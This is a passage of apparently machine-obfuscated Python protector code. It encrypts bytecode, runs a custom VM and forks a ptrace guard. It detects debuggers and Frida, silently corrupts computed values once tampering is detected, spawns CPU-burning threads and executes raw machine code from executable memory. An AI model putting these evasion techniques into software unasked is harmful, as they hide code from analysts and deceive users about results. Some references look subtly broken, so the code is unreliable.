        self.halted = False


class _nixon_ろჱϜ茢κОᏉł:
    _tboxes = None
    _inv_tboxes = None
    @staticmethod
    def _nixon_Ѯϙᚽȉჶ(key_bytes):
        if len(key_bytes) < 16:
            key_bytes = key_bytes + b'\x00' * (16 - len(key_bytes))
        key_bytes = key_bytes[:16]
        _nixon_ろჱϜ茢κОᏉł._tboxes = []
        _nixon_ろჱϜ茢κОᏉł._inv_tboxes = []
        for round_num in range(4):
            tbox = bytearray(256)
            inv_tbox = bytearray(256)
            round_key = key_bytes[round_num * 4:(round_num + 1) * 4]
            for i in range(256):
                mixed = i
                for kb in round_key:
                    mixed = ((mixed * 167 + kb + round_num * 31) ^ (mixed >> 3)) & 0xFF
                tbox[i] = mixed
                inv_tbox[mixed] = i
            _nixon_ろჱϜ茢κОᏉł._tboxes.append(bytes(tbox))
            _nixon_ろჱϜ茢κОᏉł._inv_tboxes.append(bytes(inv_tbox))
    @staticmethod
    def _nixon_ǣվɐᎺॼรɗʦึჃ(data):
        if _nixon_ろჱϜ茢κОᏉł._tboxes is None:
            return data
        result = bytearray(data)
        num_rounds = len(_nixon_ろჱϜ茢κОᏉł._tboxes)
        for round_num in range(num_rounds):
            tbox = _nixon_ろჱϜ茢κОᏉł._tboxes[round_num]
            for i in range(len(result)):
                result[i] = tbox[result[i]]
            if round_num < num_rounds - 1:
                for i in range(len(result) - 1):
                    result[i + 1] ^= result[i]
        return bytes(result)
    @staticmethod
    def _nixon_勳ƄεɥᎸᏬ(data):
        if _nixon_ろჱϜ茢κОᏉł._inv_tboxes is None:
            return data
        result = bytearray(data)
        num_rounds = len(_nixon_ろჱϜ茢κОᏉł._inv_tboxes)
        for round_num in range(num_rounds - 1, -1, -1):
            if round_num < num_rounds - 1:
                for i in range(len(result) - 1, 0, -1):
                    result[i] ^= result[i - 1]
            inv_tbox = _nixon_ろჱϜ茢κОᏉł._inv_tboxes[round_num]
            for i in range(len(result)):
                result[i] = inv_tbox[result[i]]
        return bytes(result)


class _nixon_鍑べ嗦ᏇকჸΜでʢƝ:
    _encrypted_funcs = dict()
    _session_key = None
    _active_decryptions = 0
    @staticmethod
    def _nixon_גჃ帱Ꮕ睕ؓ諷(session_key=None):
        _nixon_鍑べ嗦ᏇকჸΜでʢƝ._session_key = session_key or _nixon_オペレーション운영.urandom(32)
    @staticmethod
    def _nixon_まۯխמҟϬ(func):
        try:
            code = func.__code__
            raw = code.co_code
            key = _nixon_鍑べ嗦ᏇকჸΜでʢƝ._session_key
            if key is None:
                _nixon_鍑べ嗦ᏇকჸΜでʢƝ._nixon_גჃ帱Ꮕ睕ؓ諷()
                key = _nixon_鍑べ嗦ᏇকჸΜでʢƝ._session_key
            encrypted = bytearray(len(raw))
            for i in range(len(raw)):
                encrypted[i] = raw[i] ^ key[i % len(key)]
            _nixon_鍑べ嗦ᏇকჸΜでʢƝ._encrypted_funcs[id(func)] = (bytes(encrypted), code)
        except: pass
        def wrapper(*args, **kwargs):
            _nixon_鍑べ嗦ᏇকჸΜでʢƝ._active_decryptions += 1
            entry = _nixon_鍑べ嗦ᏇকჸΜでʢƝ._encrypted_funcs.get(id(func))
            if entry is None:
                return func(*args, **kwargs)
            enc_code, orig_code = entry
            try:
                decrypted = bytearray(len(enc_code))
                k = _nixon_鍑べ嗦ᏇকჸΜでʢƝ._session_key
                for i in range(len(enc_code)):
                    decrypted[i] = enc_code[i] ^ k[i % len(k)]
                func.__code__ = orig_code.replace(co_code=bytes(decrypted))
                result = func(*args, **kwargs)
                return result
            finally:
                try:
                    noise = _nixon_オペレーション운영.urandom(len(enc_code))
                    func.__code__ = orig_code.replace(co_code=bytes(noise))
                except: pass
                _nixon_鍑べ嗦ᏇকჸΜでʢƝ._active_decryptions -= 1
        wrapper.__name__ = func.__name__
        wrapper._protected = True
        return wrapper
    @staticmethod
    def _nixon_ŮりѰ่Ꮶ():
        return _nixon_鍑べ嗦ᏇকჸΜでʢƝ._active_decryptions > 0


# NOTE (kill-ladder allowlist): like NANOMITE_SOURCE above, the child
# fast-exit here is the forked tracer child exiting 0 on completion —
# never the tamper path. Not routed through _16cbeae604_k by design.
class _nixon_こ俯ۼᏪৄฉĚבฑ:
    _is_guarded = False
    _child_pid = None
    _guard_key = None
    @staticmethod
    def _nixon_ႮᏇؔʕŧ():
        if _nixon_プラットフォーム플랫폼.system() != _nixon_űƋთฺซט毓בը(58):
            _nixon_こ俯ۼᏪৄฉĚבฑ._is_guarded = True
            return True
        try:
            import ctypes as _ct
            import signal as _sig
            _libc = _ct.CDLL(_nixon_űƋთฺซט毓בը(59), use_errno=True)
            PTRACE_ATTACH = (59468 ^ 59484)
            PTRACE_CONT = (44643 ^ 44644)
            import warnings as _w
            with _w.catch_warnings():
                _w.simplefilter("ignore", DeprecationWarning)
                pid = _nixon_オペレーション운영.fork()
            if pid == 0:
                _nixon_オペレーション운영.environ[_nixon_űƋთฺซט毓בը(81)] = str(_nixon_オペレーション운영.getppid())
                _nixon_時間시간.sleep(0.05)
                _nixon_こ俯ۼᏪৄฉĚבฑ._child_pid = _nixon_オペレーション운영.getppid()
                _nixon_こ俯ۼᏪৄฉĚבฑ._guard_key = _nixon_ハッシュ해시.sha256(str(_nixon_オペレーション운영.getpid()).encode()).digest()[:16]
                _nixon_こ俯ۼᏪৄฉĚבฑ._is_guarded = True
                return True
            else:
                try:
                    _nixon_時間시간.sleep(0.1)
                    _libc.ptrace(PTRACE_ATTACH, pid, None, None)
                    _nixon_オペレーション운영.waitpid(pid, 0)
                    _libc.ptrace(PTRACE_CONT, pid, None, None)
                    while True:
                        _, _st = _nixon_オペレーション운영.waitpid(pid, 0)
                        if _nixon_オペレーション운영.WIFEXITED(_st) or _nixon_オペレーション운영.WIFSIGNALED(_st):
                            break
                        _libc.ptrace(PTRACE_CONT, pid, None, None)
                except: pass
                _nixon_オペレーション운영._exit(0)
        except:
            _nixon_こ俯ۼᏪৄฉĚבฑ._is_guarded = True
            return True
    @staticmethod
    def _nixon_ʞॉუᎷづᚮʝاॺ():
        return _nixon_こ俯ۼᏪৄฉĚבฑ._is_guarded
    @staticmethod
    def _nixon_ᏞᏄᛥႶᎢ٘():
        return _nixon_こ俯ۼᏪৄฉĚבฑ._guard_key or _nixon_オペレーション운영.urandom(16)


class _nixon_χ橣҄ႧӾą:
    _fragments = dict()
    _hardware_hash = None
    _entangle_key = 0
    @staticmethod
    def _nixon_नѯۖก六אჲছ(license_key_bytes=None, hardware_id=None):
        if hardware_id is None:
            import platform as _p
            hw_str = _p.node() + _p.machine() + _p.processor()
            hardware_id = _nixon_ハッシュ해시.sha256(hw_str.encode()).digest()
        _nixon_χ橣҄ႧӾą._hardware_hash = hardware_id[:16]
        if license_key_bytes:
            frag = license_key_bytes[:16]
            hw = _nixon_χ橣҄ႧӾą._hardware_hash
            magic = b'\xde\xad\xbe\xef' * 4
            result = 0
            for i in range(16):
                result += (frag[i] ^ hw[i] ^ magic[i])
            _nixon_χ橣҄ႧӾą._entangle_key = result
        else:
            _nixon_χ橣҄ႧӾą._entangle_key = 0
    @staticmethod
    def _nixon_ۺႢถくঊฏ(value):
        return value + _nixon_χ橣҄ႧӾą._entangle_key
    @staticmethod
    def _nixon_ըめ觬৩ȢᎪƭȤՈี():
        return _nixon_χ橣҄ႧӾą._entangle_key == 0
    @staticmethod
    def _nixon_ӍიՊėǅჲՔᛌ(func):
        def wrapper(*args, **kwargs):
            result = func(*args, **kwargs)
            if isinstance(result, (int, float)):
                return result + _nixon_χ橣҄ႧӾą._entangle_key
            return result
        wrapper.__name__ = func.__name__
        return wrapper
    @staticmethod
    def _nixon_みӔѩѦĚۃŪႨ():
        return -_nixon_χ橣҄ႧӾą._entangle_key


class _nixon_یれۦゟ嘃ب:
    _base_map = None
    _context_state = 0
    _execution_history = []
    def __init__(self, seed=None):
        self.registers = [0] * 8
        self.memory = bytearray(2048)
        self.stack = []
        self.pc = 0
        self.halted = False
        self._context_state = 0
        if _nixon_یれۦゟ嘃ب._base_map is None:
            _nixon_یれۦゟ嘃ب._init_base_map(seed)
    @staticmethod
    def _init_base_map(seed=None):
        opcodes = list(range(256))
        if isinstance(seed, bytes) and seed:
            rng_seed = int.from_bytes(seed[:4], 'big')
            rng = random.Random(rng_seed)
            rng.shuffle(opcodes)
        else:
            for i in range(255, 0, -1):
                j = _struct_randbelow(i + 1)
                opcodes[i], opcodes[j] = opcodes[j], opcodes[i]
        _nixon_یれۦゟ嘃ب._base_map = dict()
        for i in range(16):
            _nixon_یれۦゟ嘃ب._base_map[opcodes[i]] = i
    def _decode_opcode(self, raw_byte):
        shifted = (raw_byte ^ (self._context_state & 0xFF)) & 0xFF
        base_op = _nixon_یれۦゟ嘃ب._base_map.get(shifted)
        if base_op is not None:
            return base_op
        return _nixon_یれۦゟ嘃ب._base_map.get(raw_byte, -1)
    def _update_context(self, op, result):
        self._context_state = ((self._context_state * 2654435761) + op + (result & 0xFFFF) + 1) & 0xFFFFFFFF
        self._execution_history.append(self._context_state & 0xFF)
        if len(self._execution_history) > 64:
            self._execution_history = self._execution_history[-64:]
    def _nixon_ৠ莾ᛟูƛר(self, bytecode, max_steps=10000):
        self.pc = 0
        steps = 0
        bc = bytecode
        bc_len = len(bc)
        while not self.halted and self.pc < bc_len and steps < max_steps:
            raw_op = bc[self.pc]
            op = self._decode_opcode(raw_op)
            self.pc += 1
            steps += 1
            result = 0
            if op == 0:
                dst = bc[self.pc] % 8; val = (bc[self.pc+1] << 8) | bc[self.pc+2]
                self.registers[dst] = val
                result = val
                self.pc += 3
            elif op == 1:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] = (self.registers[dst] + self.registers[src]) & 0xFFFFFFFF
                result = self.registers[dst]
                self.pc += 2
            elif op == 2:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] ^= self.registers[src]
                result = self.registers[dst]
                self.pc += 2
            elif op == 3:
                target = (bc[self.pc] << 8) | bc[self.pc+1]
                self.pc = target
                result = target
            elif op == 4:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] = (self.registers[dst] - self.registers[src]) & 0xFFFFFFFF
                result = self.registers[dst]
                self.pc += 2
            elif op == 5:
                src = bc[self.pc] % 8
                self.stack.append(self.registers[src])
                result = self.registers[src]
                self.pc += 1
            elif op == 6:
                dst = bc[self.pc] % 8
                self.registers[dst] = self.stack.pop() if self.stack else 0
                result = self.registers[dst]
                self.pc += 1
            elif op == 7:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] = (self.registers[dst] * self.registers[src]) & 0xFFFFFFFF
                result = self.registers[dst]
                self.pc += 2
            elif op == 15:
                self.halted = True
            else:
                self.pc += 1
            self._update_context(op, result)
        return self.registers[0]
    def _nixon_ȳ眕ᎡՉɰ(self):
        self.registers = [0] * 8
        self.stack = []
        self.pc = 0
        self.halted = False
        self._context_state = 0
    def _nixon_ʫǉʢᏕ惫ॵ筊ȏ(self):
        return self._context_state


class _nixon_חᏟゐĠჴᏉঢ:
    _tboxes = None
    _inv_tboxes = None
    _mix_keys = None
    _num_rounds = (59086 ^ 59078)
    @staticmethod
    def _nixon_ႼтআƫʠზסĞ(key_bytes, num_rounds=(49659 ^ 49651)):
        _nixon_חᏟゐĠჴᏉঢ._num_rounds = num_rounds
        key_expanded = key_bytes
        while len(key_expanded) < num_rounds * 4:
            key_expanded = key_expanded + _nixon_ハッシュ해시.sha256(key_expanded).digest()
        _nixon_חᏟゐĠჴᏉঢ._tboxes = []
        _nixon_חᏟゐĠჴᏉঢ._inv_tboxes = []
        _nixon_חᏟゐĠჴᏉঢ._mix_keys = []
        for r in range(num_rounds):
            round_key = key_expanded[r * 4:(r + 1) * 4]
            tbox = list(range(256))
            rng = random.Random(int.from_bytes(round_key, 'big') + r * 0x9E3779B9)
            rng.shuffle(tbox)
            inv_tbox = [0] * 256
            for i in range(256):
                inv_tbox[tbox[i]] = i
            _nixon_חᏟゐĠჴᏉঢ._tboxes.append(bytes(tbox))
            _nixon_חᏟゐĠჴᏉঢ._inv_tboxes.append(bytes(inv_tbox))
            mix = _nixon_ハッシュ해시.sha256(round_key + str(r).encode()).digest()[:16]
            _nixon_חᏟゐĠჴᏉঢ._mix_keys.append(mix)
    @staticmethod
    def _mix_columns(data, mix_key):
        result = bytearray(len(data))
        for i in range(len(data)):
            result[i] = data[i] ^ mix_key[i % len(mix_key)]
        for i in range(len(result) - 1):
            result[i + 1] = (result[i + 1] + result[i]) & 0xFF
        return result
    @staticmethod
    def _inv_mix_columns(data, mix_key):
        result = bytearray(data)
        for i in range(len(result) - 1, 0, -1):
            result[i] = (result[i] - result[i - 1]) & 0xFF
        for i in range(len(result)):
            result[i] = result[i] ^ mix_key[i % len(mix_key)]
        return result
    @staticmethod
    def _nixon_ɯঌڱᎳᛄ(data):
        if _nixon_חᏟゐĠჴᏉঢ._tboxes is None:
            return data
        result = bytearray(data)
        for r in range(_nixon_חᏟゐĠჴᏉঢ._num_rounds):
            tbox = _nixon_חᏟゐĠჴᏉঢ._tboxes[r]
            for i in range(len(result)):
                result[i] = tbox[result[i]]
            if r < _nixon_חᏟゐĠჴᏉঢ._num_rounds - 1:
                result = _nixon_חᏟゐĠჴᏉঢ._mix_columns(result, _nixon_חᏟゐĠჴᏉঢ._mix_keys[r])
        return bytes(result)
    @staticmethod
    def _nixon_仁นӽণ苴ঽ(data):
        if _nixon_חᏟゐĠჴᏉঢ._inv_tboxes is None:
            return data
        result = bytearray(data)
        for r in range(_nixon_חᏟゐĠჴᏉঢ._num_rounds - 1, -1, -1):
            if r < _nixon_חᏟゐĠჴᏉঢ._num_rounds - 1:
                result = _nixon_חᏟゐĠჴᏉঢ._inv_mix_columns(result, _nixon_חᏟゐĠჴᏉঢ._mix_keys[r])
            inv_tbox = _nixon_חᏟゐĠჴᏉঢ._inv_tboxes[r]
            for i in range(len(result)):
                result[i] = inv_tbox[result[i]]
        return bytes(result)


class _nixon_ӴƖՅבᏨ蛎Ўउ:
    _epsilon = 0
    _drift_count = 0
    _anomaly_detected = False
    _injection_points = dict()
    @staticmethod
    def _nixon_覉ेृ۵ჾᎦᛐ(severity=1):
        base_drift = 1
        for _ in range(15):
            base_drift = base_drift * 10
        epsilon = severity / base_drift
        _nixon_ӴƖՅבᏨ蛎Ўउ._epsilon += epsilon
        _nixon_ӴƖՅבᏨ蛎Ўउ._drift_count += 1
        _nixon_ӴƖՅבᏨ蛎Ўउ._anomaly_detected = True
    @staticmethod
    def _nixon_წिᎨϔᎯᎳպᛪ(value, iterations=1):
        if _nixon_ӴƖՅבᏨ蛎Ўउ._epsilon == 0:
            return value
        if isinstance(value, int):
            drift = int(_nixon_ӴƖՅבᏨ蛎Ўउ._epsilon * (iterations * iterations))
            return value + drift
        return value
    @staticmethod
    def _nixon_ȢかɩᏘǚᏕןǯȞə(value, iteration_count):
        if not _nixon_ӴƖՅבᏨ蛎Ўउ._anomaly_detected:
            return value
        if isinstance(value, (int,)):
            accumulated = 0
            e = _nixon_ӴƖՅבᏨ蛎Ўउ._epsilon
            for i in range(min(iteration_count, 1000)):
                accumulated += int(e * (i + 1))
                e = e * 2
            return value + accumulated
        return value
    @staticmethod
    def _nixon_ŗהせŹՃ():
        anomaly_score = 0
        try:
            import sys as _s
            if _s.gettrace() is not None:
                anomaly_score += 3
        except: pass
        try:
            t1 = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, _nixon_űƋთฺซט毓בը(165)) else int(_nixon_時間시간.perf_counter() * 1000000000)
            total = 0
            for i in range(10000):
                total += i
            t2 = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, _nixon_űƋთฺซט毓בը(165)) else int(_nixon_時間시간.perf_counter() * 1000000000)
            delta = t2 - t1
            if delta > 100000000:
                anomaly_score += 2
        except: pass
        if anomaly_score > 0:
            _nixon_ӴƖՅבᏨ蛎Ўउ._nixon_覉ेृ۵ჾᎦᛐ(anomaly_score)
        return anomaly_score
    @staticmethod
    def _nixon_ばरĄڪրৃႽᎧ():
        return _nixon_ӴƖՅבᏨ蛎Ўउ._anomaly_detected


class _nixon_ҏმᛉؔᛩ:
    _generated_functions = dict()
    _bloat_seed = None
    @staticmethod
    def _nixon_ॐֈнওुぎ(seed=None):
        _nixon_ҏმᛉؔᛩ._bloat_seed = seed or _nixon_オペレーション운영.urandom(16)
    @staticmethod
    def _nixon_υיʣΡが茷(count=(2449 ^ 2467)):
        rng = random.Random(int.from_bytes(_nixon_ҏმᛉؔᛩ._bloat_seed or _nixon_オペレーション운영.urandom(8), 'big'))
        def _mk(idx, sd):
            pfx = [_nixon_űƋთฺซט毓בը(168), _nixon_űƋთฺซט毓בը(169), _nixon_űƋთฺซט毓בը(170), _nixon_űƋთฺซט毓בը(171), _nixon_űƋთฺซט毓בը(172)]
            t = idx % 5
            name = pfx[t] + str(idx) + '_' + str(sd)
            n = rng.randint(100, 10000); m = rng.randint(1, 100); k = rng.randint(0, 255)
            lim = rng.randint(100000, 9999999); md = rng.randint(1000, 99999)
            sa = rng.randint(100000, 999999); tg = rng.randint(0, 0xFFFFFFFF)
            bs = rng.randint(32, 512); st = rng.randint(2, 16); xk = rng.randint(0, 255)
            ks = format(rng.randint(0, 2**64), 'x')
            ps = rng.randint(16, 256); vc = rng.randint(10, 100)
            vs = rng.randint(0, 99999); vm = rng.randint(1, 50); va = rng.randint(0, 1000)
            if t == 0:
                return _nixon_űƋთฺซט毓בը(173) + name + '():\n    total = 0\n    for i in range(' + str(n) + '):\n        total += i * ' + str(m) + ' + ' + str(k) + '\n        if total > ' + str(lim) + ': total = total % ' + str(md) + '\n    return total'
            elif t == 1:
                return _nixon_űƋთฺซט毓בը(173) + name + '(token=None):\n    h = _nixon_ハッシュ해시.sha256(str(token or ' + str(sa) + ').encode()).hexdigest()\n    parts = [h[i:i+8] for i in range(0, len(h), 8)]\n    combined = 0\n    for p in parts: combined ^= int(p, 16)\n    return combined == ' + str(tg)
            elif t == 2:
                return _nixon_űƋთฺซט毓בը(173) + name + '(data=None):\n    buf = data or b"\\x00" * ' + str(bs) + '\n    result = []\n    for i in range(0, len(buf), ' + str(st) + '):\n        chunk = buf[i:i+' + str(st) + ']\n        val = sum(chunk) ^ ' + str(xk) + '\n        result.append(val & 0xFF)\n    return bytes(result)'
            elif t == 3:
                return _nixon_űƋთฺซט毓בը(173) + name + '(payload=None):\n    key = _nixon_ハッシュ해시.sha256(b"' + ks + '").digest()\n    if payload is None: payload = b"\\x00" * ' + str(ps) + '\n    out = bytearray(len(payload))\n    for i in range(len(payload)):\n        out[i] = payload[i] ^ key[i % 32]\n    return bytes(out)'
            else:
                return _nixon_űƋთฺซט毓בը(173) + name + '(master=None):\n    vault = dict()\n    for i in range(' + str(vc) + '):\n        k = _nixon_ハッシュ해시.md5(str(i + ' + str(vs) + ').encode()).hexdigest()[:8]\n        v = i * ' + str(vm) + ' + ' + str(va) + '\n        vault[k] = v\n    if master: return vault.get(_nixon_ハッシュ해시.md5(str(master).encode()).hexdigest()[:8])\n    return None'
        generated = []
        for idx in range(count):
            seed_hex = rng.randint(100000, 999999)
            code = _mk(idx, seed_hex)
            generated.append(code)
            _nixon_ҏმᛉؔᛩ._generated_functions[_nixon_űƋთฺซט毓בը(168) + str(idx) + '_' + str(seed_hex)] = code
        ns = dict()
        for code in generated:
            try:
                exec(code, ns)
            except: pass
        return len(generated)
    @staticmethod
    def _nixon_γचƊТЇĚ():
        return len(_nixon_ҏმᛉؔᛩ._generated_functions)


class _nixon_ᛠȢƧДڰোᎰᎶश:
    @staticmethod
    def _nixon_ΌմΊぷᛆ():
        try:
            import ctypes, sys, os
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent(): return True
            is_debug = ctypes.c_bool(False)
            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debug))
            if is_debug.value: return True
            ntdll = ctypes.windll.ntdll
            process_debug_port = ctypes.c_uint64(0)
            status = ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 7, ctypes.byref(process_debug_port), ctypes.sizeof(process_debug_port), None)
            if status == 0 and process_debug_port.value != 0: return True
        except: pass
        return False
    @staticmethod
    def _nixon_婳ע慆槨קʓΰڰ():
        try:
            import ctypes
            # Do NOT call ctypes.util.find_library here. On macOS it can shell out
            # to the linker/otool, and a subprocess launched from this threaded
            # artifact has been observed to block for minutes -- which is one of
            # the two ways this artefact has hung. CDLL(None) resolves ptrace
            # from the already-loaded libSystem, with no subprocess at all.
            libc = ctypes.CDLL(None)
            libc.ptrace(31, 0, 0, 0)
        except: pass
        return False
    @staticmethod
    def _nixon_ญᏮϓĜ帮ჱᛈƔɢ腉():
        try:
            import os
            my_pid = os.getpid()
            tracer_pid = 0
            with open(_nixon_űƋთฺซט毓בը(60), "r", encoding='utf-8') as f:
                for line in f:
                    if line.startswith(_nixon_űƋთฺซט毓בը(66)):
                        tracer_pid = int(line.split(":")[1].strip())
                        break
            if tracer_pid != 0:
                nano_pid_str = os.environ.get(_nixon_űƋთฺซט毓בը(81), '')
                if not (nano_pid_str and str(tracer_pid) == nano_pid_str):
                    return True
            import socket
            for port in [27042, 27043]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    if s.connect_ex((_nixon_űƋთฺซט毓בը(109), port)) == 0:
                        s.close()
                        return True
                    s.close()
                except: pass
        except: pass
        return False
    @staticmethod
    def _nixon_ঠゟᛣ刪響Ⴤӏ():
        import platform, os
        sys_plat = platform.system().lower()
        detected = False
        if _nixon_űƋთฺซט毓בը(33) in sys_plat:
            detected = _nixon_ᛠȢƧДڰোᎰᎶश._nixon_ΌմΊぷᛆ()
        elif _nixon_űƋთฺซט毓בը(35) in sys_plat:
            detected = _nixon_ᛠȢƧДڰোᎰᎶश._nixon_婳ע慆槨קʓΰڰ()
        elif _nixon_űƋთฺซט毓בը(34) in sys_plat:
            if os.path.exists(_nixon_űƋთฺซט毓בը(174)) or os.path.exists(_nixon_űƋთฺซט毓בը(83)):
                detected = _nixon_ᛠȢƧДڰোᎰᎶश._nixon_ญᏮϓĜ帮ჱᛈƔɢ腉()
            else:
                pass
        return detected


class _nixon_ģᏖũƹᏊʠႵϥǉ:
    _entropy_thread = None
    _stop_entropy = False
    _prev_state = 0
    @staticmethod
    def _nixon_ঋে縃焵Ⴍ():
        def _noise_generator():
            try:
                # 64 MB per iteration, eight threads, no pause: on Linux this
                # reads /dev/urandom (a file read, cheap) but everywhere else it
                # called os.urandom(64MB) in a tight loop, which saturates the
                # machine and starves the payload's own thread. The artifact then
                # never finishes -- measured as a 100s timeout with every thread
                # parked in this function, on Windows and macOS but never Linux.
                # The noise still happens; it no longer monopolises the CPU.
                import time as _nx_noise_time
                # Intensity is a build-time choice: --strict-detections restores
                # the original 64MB per iteration with no pause (maximum
                # attrition), the default stays at 256KB with a 200ms pause so
                # the payload is never starved of CPU.
                buf_size = (64 * 1024 * 1024) if False else (256 * 1024)
                if _nixon_プラットフォーム플랫폼.system() in (_nixon_űƋთฺซט毓בը(58), _nixon_űƋთฺซט毓בը(175)):
                    with open(_nixon_űƋთฺซט毓בը(176), "rb") as f:
                        while not _nixon_ģᏖũƹᏊʠႵϥǉ._stop_entropy:
                            _ = f.read(buf_size)
                            _nx_noise_time.sleep(0.2)
                else:
                    while not _nixon_ģᏖũƹᏊʠႵϥǉ._stop_entropy:
                        _ = _nixon_オペレーション운영.urandom(buf_size)
                        _nx_noise_time.sleep(0.2)
            except: pass
        for _ in range(8):
            _nixon_スレッディング스레딩.Thread(target=_noise_generator, daemon=True).start()
    @staticmethod
    def _nixon_כどछჰภะ(difficulty=(34582 ^ 34578)):
        prefix = _nixon_オペレーション운영.urandom(8).hex()
        nonce = 0
        target = "0" * difficulty
        while True:
            h = _nixon_ハッシュ해시.sha256((prefix + str(nonce)).encode()).hexdigest()
            if h.startswith(target):
                return nonce
            nonce += 1
            if nonce > 1000000: break
        return nonce
    @staticmethod
    def _nixon_γ式ϖğ稆ძʬոぅ(input_val):
        current_state = _nixon_ģᏖũƹᏊʠႵϥǉ._prev_state
        new_state = _nixon_ハッシュ해시.sha256(str(current_state).encode() + str(input_val).encode()).digest()
        _nixon_ģᏖũƹᏊʠႵϥǉ._prev_state = int.from_bytes(new_state[:8], 'little')
        return int.from_bytes(new_state[8:16], 'little')
    @staticmethod
    def _nixon_ם๋ᚻोάͱゕγІ鉤():
        def _spam_rdtsc():
            try:
                import ctypes, mmap
                machine = _nixon_プラットフォーム플랫폼.machine().lower()
                if _nixon_űƋთฺซט毓בը(177) in machine or _nixon_űƋთฺซט毓בը(141) in machine:
                    code = b'\x48\xB9\x00\xE1\xF5\x05\x00\x00\x00\x00\x0F\x31\x48\xFF\xC9\x75\xFB\xC3'
                    prot = mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
                    flags = mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS
                    mm = mmap.mmap(-1, len(code), flags=flags, prot=prot)
                    mm.write(code)
                    func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_int.from_buffer(mm)))
                    while not _nixon_ģᏖũƹᏊʠႵϥǉ._stop_entropy:
                        func()
                        if not False: _nixon_時間시간.sleep(0.05)
                else:
                    while not _nixon_ģᏖũƹᏊʠႵϥǉ._stop_entropy:
                        _ = _nixon_時間時間.perf_counter_ns()
                        # Unthrottled spinning starves interpreter shutdown on a
                        # slow or ARM host: the payload printed its correct output
                        # and then hung until the tracer killed it. Throttled by
                        # default, unthrottled under --strict-detections.
                        if not False: _nixon_時間時間.sleep(0.05)
            except: pass
        for _ in range(4):
            _nixon_スレッディング스레딩.Thread(target=_spam_rdtsc, daemon=True).start()

class _nixon_なרᛏĆՕٟĩٺई:
    def __init__(self, nx_polys=None, batch_size=(13968 ^ 12944)):
        import ctypes, os
        self.batch_size = batch_size
        self._use_c = False
        try:
            self.lib = ctypes.CDLL(os.path.join(os.path.dirname(__file__), _nixon_űƋთฺซט毓בը(178)))
            self.lib.FHE_new.restype = ctypes.c_void_p
            self.lib.FHE_new.argtypes = [ctypes.c_size_t]
            self.lib.FHE_encrypt_batch.restype = ctypes.POINTER(ctypes.c_uint32)
            self.lib.FHE_encrypt_batch.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.c_size_t]
            self.lib.FHE_add_batch.restype = ctypes.POINTER(ctypes.c_uint32)
            self.lib.FHE_add_batch.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32), ctypes.c_size_t]
            self.lib.FHE_dec_batch.restype = ctypes.POINTER(ctypes.c_uint32)
            self.lib.FHE_dec_batch.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.c_size_t]
            self.lib.FHE_free_array.argtypes = [ctypes.POINTER(ctypes.c_uint32)]
            self._ptr = self.lib.FHE_new(batch_size)
            self._use_c = True
        except (AttributeError, OSError):
            import warnings as _w
            _w.warn('FHE C module not available; using the pure-Python fallback (same scheme, slower)', RuntimeWarning, stacklevel=(60049 ^ 60051))
        
    def _fhe_mask(self, index):
        """The per-slot mask: LE32(SHA-256(key || nonce || LE64(i))) & 0x7fffffff.

        The SAME derivation as the C core, so the two paths are
        interchangeable.
        """
        import hashlib, os
        if not hasattr(self, _nixon_űƋთฺซט毓בը(179)):
            self._fhe_key = os.urandom(32)
            self._fhe_nonce = os.urandom(8)
        _d = hashlib.sha256(self._fhe_key + self._fhe_nonce +
                            int(index).to_bytes(8, "little")).digest()
        return int.from_bytes(_d[:4], "little") & 0x7fffffff

    def encrypt_batch(self, value_array):
        import ctypes
        if self._use_c:
            arr = (ctypes.c_uint32 * len(value_array))(*value_array)
            ptr = self.lib.FHE_encrypt_batch(self._ptr, arr, len(value_array))
            res = [ptr[i] for i in range(self.batch_size)]
            self.lib.FHE_free_array(ptr)
        else:
            # The same one-time pad as the C core: the value part is
            # masked, the top bit says _nixon_űƋთฺซט毓בը(180).
            res = []
            for i in range(self.batch_size):
                _m = 0
                if i < len(value_array):
                    _m = int(value_array[i]) & 0x7fffffff
                res.append((_m ^ self._fhe_mask(i)) & 0xffffffff)
        return res

    def add_batch(self, c1, c2):
        import ctypes
        if self._use_c:
            a = (ctypes.c_uint32 * len(c1))(*c1)
            b = (ctypes.c_uint32 * len(c2))(*c2)
            ptr = self.lib.FHE_add_batch(self._ptr, a, b, self.batch_size)
            res = [ptr[i] for i in range(self.batch_size)]
            self.lib.FHE_free_array(ptr)
        else:
            # Unmask both sides, combine, re-mask iff exactly one side
            # was masked.  The top bit carries the level.
            res = []
            for i in range(self.batch_size):
                _mask = self._fhe_mask(i)
                _av = (c1[i] if i < len(c1) else 0) & 0x7fffffff
                _bv = (c2[i] if i < len(c2) else 0) & 0x7fffffff
                _au = bool((c1[i] if i < len(c1) else 0) & 0x80000000)
                _bu = bool((c2[i] if i < len(c2) else 0) & 0x80000000)
                if not _au:
                    _av ^= _mask
                if not _bu:
                    _bv ^= _mask
                _v = (_av ^ _bv) & 0x7fffffff
                _unmasked = _au and _bu
                if not _unmasked:
                    _v ^= _mask
                res.append((_v | (0x80000000 if _unmasked else 0)) & 0xffffffff)
        return res

    def dec_batch(self, c_enc):
        import ctypes
        if self._use_c:
            arr = (ctypes.c_uint32 * len(c_enc))(*c_enc)
            ptr = self.lib.FHE_dec_batch(self._ptr, arr, self.batch_size)
            res = [ptr[i] for i in range(self.batch_size)]
            self.lib.FHE_free_array(ptr)
        else:
            res = []
            for i in range(self.batch_size):
                _c = (c_enc[i] if i < len(c_enc) else 0)
